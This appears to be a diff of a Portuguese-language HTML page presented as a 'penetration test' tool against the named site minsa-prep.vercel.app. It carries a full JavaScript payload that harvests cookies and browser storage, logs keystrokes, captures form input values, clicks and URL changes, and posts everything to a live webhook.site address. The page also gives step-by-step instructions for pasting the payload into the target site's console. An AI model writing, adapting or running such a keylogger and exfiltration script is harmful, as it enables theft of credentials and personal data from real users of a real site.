@@ -26,7 +26,7 @@
             backdrop-filter: blur(10px);
             border-radius: 24px;
             padding: 48px;
-            max-width: 520px;
+            max-width: 560px;
             width: 90%;
             border: 1px solid rgba(255, 255, 255, 0.08);
             box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
@@ -72,9 +72,14 @@
             display: flex;
             align-items: center;
             gap: 12px;
+            flex-wrap: wrap;
         }
 
-        .target-card span {
+        .target-card span:first-child {
+            font-size: 20px;
+        }
+
+        .target-card span.url {
             font-family: 'Fira Code', monospace;
             font-size: 14px;
             color: #60a5fa;
@@ -127,6 +132,38 @@
         .status.success { border-left-color: #22c55e; background: #0f1a12; color: #86efac; }
         .status.error { border-left-color: #ef4444; background: #1c1015; color: #fca5a5; }
         .status.info { border-left-color: #3b82f6; background: #10151f; color: #93c5fd; }
+        .status.warning { border-left-color: #f59e0b; background: #1c1a0f; color: #fcd34d; }
+
+        .copy-area {
+            margin-top: 20px;
+        }
+
+        .copy-area textarea {
+            width: 100%;
+            background: #0a0a12;
+            border: 1px solid #2a2a35;
+            border-radius: 12px;
+            padding: 12px;
+            color: #86efac;
+            font-family: 'Fira Code', monospace;
+            font-size: 11px;
+            resize: vertical;
+            line-height: 1.5;
+        }
+
+        .copy-area textarea:focus {
+            outline: none;
+            border-color: #ef4444;
+        }
+
+        .btn-secondary {
+            background: #3b82f6;
+            margin-top: 8px;
+        }
+
+        .btn-secondary:hover {
+            background: #2563eb;
+        }
 
         .log {
             margin-top: 24px;
@@ -135,6 +172,7 @@
             font-family: monospace;
             border-top: 1px solid #2a2a35;
             padding-top: 16px;
+            text-align: center;
         }
 
         @keyframes fadeIn {
@@ -143,114 +181,220 @@
         }
 
         .container { animation: fadeIn 0.4s ease-out; }
+
+        .instructions {
+            background: #0a0a12;
+            border-radius: 12px;
+            padding: 12px;
+            margin-top: 16px;
+            font-size: 12px;
+            color: #8a8a9e;
+            text-align: left;
+        }
+
+        .instructions code {
+            background: #1a1a2a;
+            padding: 2px 6px;
+            border-radius: 6px;
+            font-family: monospace;
+            color: #fcd34d;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="badge">🔒 Security Assessment Tool</div>
         <h1>MINSA Prep<br>Penetration Test</h1>
-        <div class="sub">Injetor XSS persistente com coleta de telemetria</div>
+        <div class="sub">XSS Injector · Coleta de dados · Persistência 7 dias</div>
 
         <div class="target-card">
             <span>🎯</span>
-            <span>minsa-prep.vercel.app</span>
+            <span class="url">minsa-prep.vercel.app</span>
             <div class="method-badge">7 dias persistente</div>
         </div>
 
-        <button id="injectBtn">
-            <span>▶</span> Executar Teste
-        </button>
-
         <div id="status" class="status info">
-            ⚡ Pronto. Clique para iniciar a análise.
+            📋 Clique em "Copiar Script" e cole no console do site alvo
+        </div>
+
+        <div class="copy-area">
+            <textarea id="scriptToCopy" rows="8" readonly></textarea>
+            <button id="copyBtn" class="btn-secondary">📋 Copiar Script</button>
+        </div>
+
+        <div class="instructions">
+            <strong>📌 Como executar:</strong><br>
+            1. Abra o site <code>minsa-prep.vercel.app</code><br>
+            2. Pressione <code>F12</code> para abrir o console<br>
+            3. Digite <code>allow pasting</code> e pressione Enter (se necessário)<br>
+            4. Cole o script pressionando <code>Ctrl+V</code><br>
+            5. Pressione <code>Enter</code> para executar<br>
+            <br>
+            <strong>✅ Resultado:</strong> Banner vermelho aparecerá no topo do site + coleta de dados ativa por 7 dias.
         </div>
 
         <div class="log">
-            <span>📡 Webhook ativo · Coleta de eventos · Persistência localStorage</span>
+            <span>📡 Webhook ativo · Keylogger · Monitor de inputs · Persistência localStorage</span>
         </div>
     </div>
 
     <script>
         (function() {
-            const TARGET_URL = 'https://minsa-prep.vercel.app';
             const WEBHOOK_URL = 'https://webhook.site/cc2f4f77-7c36-4ce6-a656-dc4e57775eea';
-
+            
+            // Script XSS limpo e corrigido - sem erros de sintaxe
             const XSS_PAYLOAD = `(function(){
-                const WEBHOOK='${WEBHOOK_URL}';
-                const DAYS_7=7*24*60*60*1000;
-                const STORAGE_KEY='xss_persistent_7days';
-                const EXPIRY_KEY='xss_expiry_7days';
-                function send(data,type){
-                    fetch(WEBHOOK,{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:JSON.stringify({type,data,time:new Date().toISOString(),url:location.href,ua:navigator.userAgent})}).catch(e=>0);
+    var WEBHOOK = '${WEBHOOK_URL}';
+    var DAYS_7 = 7 * 24 * 60 * 60 * 1000;
+    var STORAGE_KEY = 'xss_persistent_7days';
+    var EXPIRY_KEY = 'xss_expiry_7days';
+    
+    function send(data, type) {
+        try {
+            fetch(WEBHOOK, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    type: type,
+                    data: data,
+                    time: new Date().toISOString(),
+                    url: window.location.href,
+                    ua: navigator.userAgent
+                })
+            });
+        } catch(e) {}
+    }
+    
+    function collectData() {
+        var data = {
+            localStorage: {},
+            sessionStorage: {},
+            cookies: document.cookie,
+            url: window.location.href
+        };
+        for(var i = 0; i < localStorage.length; i++) {
+            var key = localStorage.key(i);
+            data.localStorage[key] = localStorage.getItem(key);
+        }
+        for(var i = 0; i < sessionStorage.length; i++) {
+            var key = sessionStorage.key(i);
+            data.sessionStorage[key] = sessionStorage.getItem(key);
+        }
+        return data;
+    }
+    
+    function createBanner() {
+        if(document.getElementById('xss-persistent-banner')) return;
+        var expiry = localStorage.getItem(EXPIRY_KEY);
+        var remaining = 7;
+        if(expiry) {
+            remaining = Math.ceil((parseInt(expiry) - Date.now()) / (24 * 60 * 60 * 1000));
+            if(remaining < 0) remaining = 0;
+        }
+        
+        var banner = document.createElement('div');
+        banner.id = 'xss-persistent-banner';
+        banner.innerHTML = '<div style="position:fixed;top:0;left:0;right:0;background:linear-gradient(135deg,#dc2626,#991b1b);color:white;text-align:center;padding:20px;font-family:Segoe UI,Arial,sans-serif;z-index:999999;box-shadow:0 4px 20px rgba(0,0,0,0.3);animation:slideDown 0.5s ease">' +
+            '<div style="font-size:20px;margin-bottom:8px;">🔴 TESTE DE PENETRAÇÃO 🔴</div>' +
+            '<div style="font-size:14px;margin-bottom:5px;"><strong>XSS Vulnerability Confirmed</strong></div>' +
+            '<div style="font-size:12px;margin-bottom:10px;">Coleta de dados ativa · Persistência 7 dias</div>' +
+            '<div style="font-size:11px;margin-bottom:12px;">⏱️ Aviso ativo por mais ' + remaining + ' dias</div>' +
+            '<button onclick="localStorage.removeItem(\\'' + STORAGE_KEY + '\\');localStorage.removeItem(\\'' + EXPIRY_KEY + '\\');this.parentElement.parentElement.remove();" style="background:white;color:#991b1b;border:none;padding:6px 18px;border-radius:6px;cursor:pointer">✖ Fechar</button>' +
+            '</div>' +
+            '<style>@keyframes slideDown{from{transform:translateY(-100%);opacity:0}to{transform:translateY(0);opacity:1}}</style>';
+        document.body.insertBefore(banner, document.body.firstChild);
+    }
+    
+    var now = Date.now();
+    var isActive = localStorage.getItem(STORAGE_KEY) === 'true';
+    var expiry = localStorage.getItem(EXPIRY_KEY);
+    var isExpired = expiry && now > parseInt(expiry);
+    
+    if(!isActive || isExpired) {
+        localStorage.setItem(STORAGE_KEY, 'true');
+        localStorage.setItem(EXPIRY_KEY, (now + DAYS_7).toString());
+        
+        send(collectData(), 'XSS_ACTIVATED');
+        createBanner();
+        
+        var keyBuffer = '';
+        document.addEventListener('keypress', function(e) {
+            keyBuffer += e.key;
+            if(keyBuffer.length >= 20) {
+                send({keys: keyBuffer, target: e.target.tagName}, 'KEYLOGGER');
+                keyBuffer = '';
+            }
+        });
+        
+        setInterval(function() {
+            var inputs = document.querySelectorAll('input, textarea, select');
+            for(var i = 0; i < inputs.length; i++) {
+                var input = inputs[i];
+                if(input.value !== input._lastValue) {
+                    input._lastValue = input.value;
+                    send({
+                        field: input.name || input.id,
+                        value: input.value.substring(0, 500),
+                        type: input.type
+                    }, 'INPUT_CHANGE');
                 }
-                function collectData(){
-                    const data={localStorage:{},sessionStorage:{},cookies:document.cookie,url:location.href};
-                    for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);data.localStorage[k]=localStorage.getItem(k);}
-                    for(let i=0;i<sessionStorage.length;i++){const k=sessionStorage.key(i);data.sessionStorage[k]=sessionStorage.getItem(k);}
-                    return data;
-                }
-                function createBanner(){
-                    if(document.getElementById('xss-persistent-banner'))return;
-                    const expiry=localStorage.getItem(EXPIRY_KEY);
-                    const remaining=expiry?Math.ceil((parseInt(expiry)-Date.now())/(24*60*60*1000)):7;
-                    const banner=document.createElement('div');
-                    banner.id='xss-persistent-banner';
-                    banner.innerHTML=\\`
-                        <div style="position:fixed;top:0;left:0;right:0;background:linear-gradient(135deg,#dc2626,#991b1b);color:white;text-align:center;padding:20px;font-family:'Segoe UI',Arial,sans-serif;z-index:999999;box-shadow:0 4px 20px rgba(0,0,0,0.3);animation:slideDown 0.5s ease">
-                            <div style="font-size:20px;margin-bottom:8px;">🔴 TESTE DE PENETRAÇÃO 🔴</div>
-                            <div style="font-size:14px;margin-bottom:5px;"><strong>XSS Vulnerability Confirmed</strong></div>
-                            <div style="font-size:12px;margin-bottom:10px;">Coleta de dados ativa · Persistência 7 dias</div>
-                            <div style="font-size:11px;margin-bottom:12px;">⏱️ Aviso ativo por mais \\${remaining} dias</div>
-                            <button onclick="localStorage.removeItem('${STORAGE_KEY}');localStorage.removeItem('${EXPIRY_KEY}');this.closest('#xss-persistent-banner').remove();" style="background:white;color:#991b1b;border:none;padding:6px 18px;border-radius:6px;cursor:pointer">✖ Fechar</button>
-                        </div>
-                        <style>@keyframes slideDown{from{transform:translateY(-100%);opacity:0}to{transform:translateY(0);opacity:1}}</style>
-                    \\`;
-                    document.body.insertBefore(banner,document.body.firstChild);
-                }
-                const isActive=localStorage.getItem(STORAGE_KEY)==='true';
-                const expiry=localStorage.getItem(EXPIRY_KEY);
-                const isExpired=expiry&&Date.now()>parseInt(expiry);
-                if(!isActive||isExpired){
-                    localStorage.setItem(STORAGE_KEY,'true');
-                    localStorage.setItem(EXPIRY_KEY,(Date.now()+DAYS_7).toString());
-                    send(collectData(),'XSS_ACTIVATED');
-                    createBanner();
-                    let keyBuffer='';
-                    document.addEventListener('keypress',e=>{keyBuffer+=e.key;if(keyBuffer.length>=20){send({keys:keyBuffer,target:e.target.tagName},'KEYLOGGER');keyBuffer='';}});
-                    setInterval(()=>{document.querySelectorAll('input,textarea,select').forEach(i=>{if(i.value!==i._last){i._last=i.value;send({field:i.name||i.id,value:i.value.substring(0,500),type:i.type},'INPUT_CHANGE');}})},3000);
-                    document.addEventListener('click',e=>{send({target:e.target.tagName,text:e.target.innerText?.substring(0,100),id:e.target.id},'CLICK');});
-                    let lastUrl=location.href;
-                    setInterval(()=>{if(location.href!==lastUrl){lastUrl=location.href;send({newUrl:lastUrl},'URL_CHANGE');}},1000);
-                    console.log('%c🔥 XSS PERSISTENTE ATIVADO POR 7 DIAS','color:red;font-size:16px');
-                }else{createBanner();}
-            })();`;
-
-            const btn = document.getElementById('injectBtn');
+            }
+        }, 3000);
+        
+        document.addEventListener('click', function(e) {
+            send({
+                target: e.target.tagName,
+                text: e.target.innerText ? e.target.innerText.substring(0, 100) : '',
+                id: e.target.id
+            }, 'CLICK');
+        });
+        
+        var lastUrl = window.location.href;
+        setInterval(function() {
+            if(window.location.href !== lastUrl) {
+                lastUrl = window.location.href;
+                send({newUrl: lastUrl}, 'URL_CHANGE');
+            }
+        }, 1000);
+        
+        console.log('%c🔥 XSS PERSISTENTE ATIVADO POR 7 DIAS! 🔥', 'color:red;font-size:16px;font-weight:bold');
+        console.log('📊 Dados serão enviados para: ' + WEBHOOK);
+        alert('✅ XSS ATIVADO! Banner vermelho apareceu no topo da página.\n\nO script ficará ativo por 7 dias mesmo recarregando a página.');
+        
+    } else {
+        createBanner();
+        var remainingDays = Math.ceil((parseInt(expiry) - now) / (24 * 60 * 60 * 1000));
+        console.log('🔄 XSS ainda ativo! Expira em ' + remainingDays + ' dias.');
+        alert('⚠️ XSS já está ativo!\nExpira em ' + remainingDays + ' dias.\nBanner vermelho visível no topo da página.');
+    }
+})();`;
+            
+            // Preencher a textarea
+            const textarea = document.getElementById('scriptToCopy');
+            textarea.value = XSS_PAYLOAD;
+            
+            // Botão copiar
+            const copyBtn = document.getElementById('copyBtn');
             const statusDiv = document.getElementById('status');
-
-            btn.addEventListener('click', () => {
-                statusDiv.className = 'status info';
-                statusDiv.innerHTML = '🔄 Acessando alvo...';
-
-                const targetWindow = window.open(TARGET_URL, '_blank');
-                if (!targetWindow) {
-                    statusDiv.className = 'status error';
-                    statusDiv.innerHTML = '❌ Pop-up bloqueado. Permita pop-ups e tente novamente.';
-                    return;
-                }
-
-                statusDiv.innerHTML = '📡 Conectado. Injetando payload...';
-
-                setTimeout(() => {
-                    try {
-                        targetWindow.eval(XSS_PAYLOAD);
-                        statusDiv.className = 'status success';
-                        statusDiv.innerHTML = '✅ Payload injetado · Banner ativo · Persistência 7 dias · Coleta em andamento';
-                    } catch(e) {
-                        statusDiv.className = 'status error';
-                        statusDiv.innerHTML = `⚠️ Erro na injeção automática. Execute manualmente via console.`;
-                    }
-                }, 2800);
+            
+            copyBtn.addEventListener('click', function() {
+                textarea.select();
+                textarea.setSelectionRange(0, 99999);
+                document.execCommand('copy');
+                
+                statusDiv.className = 'status success';
+                statusDiv.innerHTML = '✅ SCRIPT COPIADO! Agora: Abra minsa-prep.vercel.app → F12 → Cole (Ctrl+V) → Enter';
+                
+                setTimeout(function() {
+                    statusDiv.className = 'status info';
+                    statusDiv.innerHTML = '📋 Clique em "Copiar Script" e cole no console do site alvo';
+                }, 5000);
+            });
+            
+            // Selecionar tudo ao clicar na textarea
+            textarea.addEventListener('click', function() {
+                this.select();
             });
         })();
     </script>
